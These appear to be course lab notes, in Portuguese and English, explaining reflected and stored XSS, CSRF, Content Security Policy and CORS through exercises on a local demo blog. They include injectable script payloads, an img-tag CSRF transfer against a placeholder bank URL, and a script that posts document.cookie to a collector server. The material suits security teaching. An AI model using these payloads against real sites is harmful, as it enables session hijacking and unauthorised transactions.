# XSS and CORS

É tipo SQL Injection mas com javascript, pelo URL, search bar, posts, comentarios etc.

>"XSS attacks are a kind of attack within Web interactions where an attacker performs indirect attacks against Web clients through a vulnerable Web application. The primary result is that some external code is injected into the victim web browser and executed. All existing context, including valid cookies, as well as computational resources of the victim become available to the attacker. The attack can be conducted based on data stored in the server, such as a forum message or a blog post, and this is named a Stored XSS Attack. The attack data can also be encoded in a Uniform Resource Locator (URL) sent by the attacker directly to the victim. Taking in consideration where the untrusted data is used, the attack can be considered a Server Side Attack, or a Client Side Attack. And all four combinations are possible. The problem itself is always due to improper, or insuﬃcient validation of data external to the system."

## Reflected XSS Attack

É um ataque *não persistente*. Manipula o browser Domain Object Model (DOM) para qualquer user que aceda ao site com o URL malicioso.

![Reflected XSS Attack](https://i.imgur.com/nsa64jh.png)

**Basicamente, se a página se comportar de forma diferente baseado em variaveis do URL, pode ser possível um Reﬂected XSS Attack.**

Na search bar do nosso site, podemos ver que quando metemos algum input, o URL muda para ```localhost:6543/search?q=<pesquisa feita>```

Se a página não validar input, podemos criar alertas com o seguinte URL:

```html
localhost:6543/search?q=<script>alert("Ola")</script>
```

Se mandarmos este link a qualquer pessoa, vai dar o pop up do alerta.

## Stored XSS Attack

Estes ataques já são considerados persistentes.

> The Stored XSS Attack (or persistent) allows an attacker to place a malicious script (usually Javascript) into a webpage (see next figure ). Victims accessing the webpage will render all scripts, including the one injected by the attacker. This attack is very common in place where information is shared between users through web technologies (e.g., forums and blogs). In this case, an attacker composes an specially crafted message, hides some script in its source code, and puts it in some place, which is accessed by a victim. All users accessing that place would execute the exploit

![Stored XSS Attack](https://i.imgur.com/Gigxw8W.png)

Existem server side e client side Stored XSS Attacks.

- **Server Side**: Usually present in actions that store messages or custom user content into the server. For a Stored XSS Attack to be considered Server Side, the payload must be included in the web page when the page is built by the server

- **Client Side**: Code that loads dynamic content into the webpage using Javascript is usually the cause of these types of attacks. Using the Web Inspector (e.g F12 in Firefox) we can find < script > tags that aren't evaluated directly but are instead included as Javascript object handlers (e.g, onload, onclick, onhover, ...)

### Server Side attack

Comentamos num post. Fazendo isto estamos a adicionar conteudo ao server, conteudo este que irá ser stored para ser mostrado (loaded) a toda a gente que entra no post.

Por tentativa e erro podemos descobrir que o campo de nome está protegido, mas a descrição do post não. Então podemos fazer o seguinte post:

```html
<script>alert("Server Side XSS Attack")</script>
```

O server vai guardar este comentario e vai dar load e executar o script sempre que alguem entrar no post.

## CSRF Attack

Injetar script que, utilizando as credenciais e capacidades do browser, pode atacar outro sistema. Pode ser utilizado para DoS ou DDoS.

![CSRF Attack](https://i.imgur.com/tWzeRGr.png)

Funciona da seguinte forma. Atualmente, grande parte dos sites que guardam as nossas credenciais utilizam **cookies**. As cookies são uma espécie de *cache*.

Para estes ataques, é frequente a utilização da tag ```<img>```

### Exemplo de ataque

```html
LOL. That was a good one Op. :) <img src='http://vulnerable-bank.com/transfer.jsp?amount=1000 &to_nib=12345300033233'></img> 
```

Quando o browser tenta carregar a imagem, invoca uma ação para o servidor executar. Neste caso hipotético, transferiria 1000 € para aquele nib.

Por vezes, é necessário javascript.

Se comentarmos o seguinte:

```html
<script>
    $.ajax({
        url: 'http://localhost:8000/cookie',
        type: 'POST',
        data: "username=Administrator;cookie=a"+document.cookie,
    })
</script>
```

Iremos receber no **stdout** toda a informação a partir do protocolo HTTP POST.
*Note: We include that 'a' in the cookie so that, in case there's no cookie, a valid argument is always passed to the hacker_server (causing it not to crash due to a bad input)*

## Content Security Policy

É uma forma de proteger um site de alguns XSS attacks. Para uma proteção mais completa, devia ser combinado com ***CORS***

O objetivo desta policy é definir que conteudo pode estar presente no HTML, ou como é lidado pelo browser.

Para ver como isto funciona, vamos considerar um exemplo em que definimos que todo o javascript deve ser loaded pelo web page server e nenhum objeto javascript de sitios externos é permitido.

For this purpose, we can set the Content-Security-Policy header to ```default-script 'self' oss.maxcdn.com```

Na nossa app, podemos ativar o Content Security Policy, removendo o comentario na linha 63 do ficheiro *xss_demo/app/xss_demo/views.py* e reiniciando o servidor.

Se tentarmos injetar scripts, agora aparece uma mensagem:

```txt
Content Security Policy: The page's settings blocked the loading of a resource at http://vulenrable-bank.com/transfer.jsp?amount=1000&to_nib1234500033233 ("img-src").
```

*Further rules could be added so that no script is added inline, no images are loaded from external sites, all resources are loaded from secure locations, etc ….*

## Cross-Origin Resource Sharing (CORS)

> Cross-Origin Resource Sharing (CORS) is a mechanism that **uses additional HTTP headers to tell a browser to let a web application running at one origin (domain) have permission to access selected resources from a server at a different origin.** A web application executes a cross-origin HTTP request when it requests a resource that has a different origin (domain, protocol, and port) than its own origin

In the previous exercises, several payload that load resources from external locations could be injected. **If CORS is properly setup, the browser will not load resources from external sites.**

Requests podem ser considerados com a seguinte tipologia:

- **Simple**
- **Preflight**

O tipo de request é definido através do metodo, headers, destino e muitos outros aspetos:

![CORS](https://i.imgur.com/gHd0eXp.png)

### Exercise setup

1. Run $sudo vim /etc/hosts
2. Add the following lines:

    ```sh
    127.0.0.1   internal
    127.0.0.1   external
    ```

3. Re-run the app (and access it using <https://internal:6543>)
4. Navigate to the scripts directory (contained within the directory we donwloaded in the beggining)
5. Run $python3 cors_server.py

*The additional server will simulate a service being exploited by an XSS attack, such as a website for a shop or a bank. The blog software we used previously will remain our method of invoking remote resources.*

Now lets inject payloads as messages in the app's posts' comments in order to test the different paths in the CORS ﬂow.

We can observe what is loaded by looking at the browser console, and the server console. Take in consideration that the browser may issue background requests that are not displayed in the network view, but logged by the server!

The following snippet can be used to simulate different requests from within Javascript.

```js
    $.ajax({
        url: 'http://external:8000/smile.jpg',
        type: 'GET',
        success: function() { alert("smile.jpg loaded"); },
    });
```

#### GET in Image tag

- Add a direct GET of an image by using the < img > tag. The server has an image named smile.jpg.

We can do this by adding: ```<img src="http://external:8000/smile.jpg"></img>``` to a comment. This will, in the app's page, load the smile.jpg image.
The external server's console will also output:

```sh
127.0.0.1 - - [05/Oct/2019 16:13:03] "GET /smile.jpg HTTP/1.1" 200 -
Serving file: smile.jpg
Request Debug:  GET
Host: external:8000
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:69.0) Gecko/20100101 Firefox/69.0
Accept: image/webp,*/*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: keep-alive
Referer: http://internal:6543/post/0
```

And we can see that the image was successfully retrieved since it loads in the comment of our internal server.

#### GET in JS

- Obtain the same resource but use the previous Javascript snippet. Observe that the browser will request the image, but will refuse to use it.

By inputting:

```html
<script>
    $.ajax({
        url: 'http://external:8000/smile.jpg',
        type: 'GET',
        success: function() { alert("smile.jpg loaded"); },
    });
</script>
```

We will get the following output in the server's console:

```sh
127.0.0.1 - - [05/Oct/2019 16:24:46] "GET /smile.jpg HTTP/1.1" 200 -
Serving file: smile.jpg
Request Debug:  GET
Host: external:8000
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:69.0) Gecko/20100101 Firefox/69.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Origin: http://internal:6543
Connection: keep-alive
Referer: http://internal:6543/post/2
Cache-Control: max-age=0
```

Unfortunately, since the alert message didnt pop up, this means that the image was not successfully retrieved.

#### GET in JS with headers

- Repeat the request but add: ,headers={"My-Header": "myvalue"} to the ajax request. The behavior should be similar to the previous case.

By inputting:

```html
<script>
    $.ajax({
        url: 'http://external:8000/smile.jpg',
        type: 'GET',
        success: function() { alert("smile.jpg loaded"); },
        headers:{"My-Header": "myvalue"},
    });
</script>
```

We will get the following output in the server's console:

```sh
127.0.0.1 - - [05/Oct/2019 16:32:49] code 501, message Unsupported method ('OPTIONS')
127.0.0.1 - - [05/Oct/2019 16:32:49] "OPTIONS /smile.jpg HTTP/1.1" 501 -
Request Debug:  OPTIONS
Host: external:8000
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:69.0) Gecko/20100101 Firefox/69.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Access-Control-Request-Method: GET
Access-Control-Request-Headers: my-header
Referer: http://internal:6543/post/1
Origin: http://internal:6543
Connection: keep-alive
```

Which very similar to the error we got on the last exercise.
Unfortunately, since the alert message didnt pop up, this means that the image was not successfully retrieved (same as before)

Note that, the reason why the first exercise's request was issued while the last 2 were denied is due to the fact that our **external server** doesn't allow its resources be shared (i.e loaded) from external sites (i.e our **internal server**). This will avoid indirect calls from users that were tricked into being a surrogate of an XSS payload.

But, because we are dealing with images, they do not pose a threat, and we can actually allow these resources to be obtained without posing any risks to us. In order to do this, we can **add a header Access-Control-Allow-Origin stating that every website can include the images from our own**.

To do this in our external server, check the file *cors_server.py* and uncomment the code
around line 20. Then repeat the previous tests.

#### GET in Image tag v2

New output:

```sh
127.0.0.1 - - [05/Oct/2019 16:38:38] "GET /smile.jpg HTTP/1.1" 200 -
Serving file: smile.jpg
Request Debug:  GET
Host: external:8000
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:69.0) Gecko/20100101 Firefox/69.0
Accept: image/webp,*/*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: keep-alive
Referer: http://internal:6543/post/0
```

**Success - Image is shown!**

#### GET in JS v2

New output:

```sh
127.0.0.1 - - [05/Oct/2019 16:42:10] "GET /smile.jpg HTTP/1.1" 200 -
Serving file: smile.jpg
Request Debug:  GET
Host: external:8000
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:69.0) Gecko/20100101 Firefox/69.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Origin: http://internal:6543
Connection: keep-alive
Referer: http://internal:6543/post/1
```

**Success - Alert success message pops up!**

#### GET in JS with headers v2

New output:

```sh
127.0.0.1 - - [05/Oct/2019 16:46:10] code 501, message Unsupported method ('OPTIONS')
127.0.0.1 - - [05/Oct/2019 16:46:10] "OPTIONS /smile.jpg HTTP/1.1" 501 -
Request Debug:  OPTIONS
Host: external:8000
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:69.0) Gecko/20100101 Firefox/69.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Access-Control-Request-Method: GET
Access-Control-Request-Headers: my-header
Referer: http://internal:6543/post/1
Origin: http://internal:6543
Connection: keep-alive
```

**Failure - Alert message doesn't pop up!**

The final test was still unsuccessful! This is because a GET with additional
headers can be used to trigger authenticated actions (user authentication
uses headers). Therefore, the browser will first check if the request can be
made by issuing an OPTIONS request. The result of this request should be
the access policy (Access-Control-Allow-Origin), and the list of methods
supported (Access-Control-Allow-Methods with each method separated
by a comma).
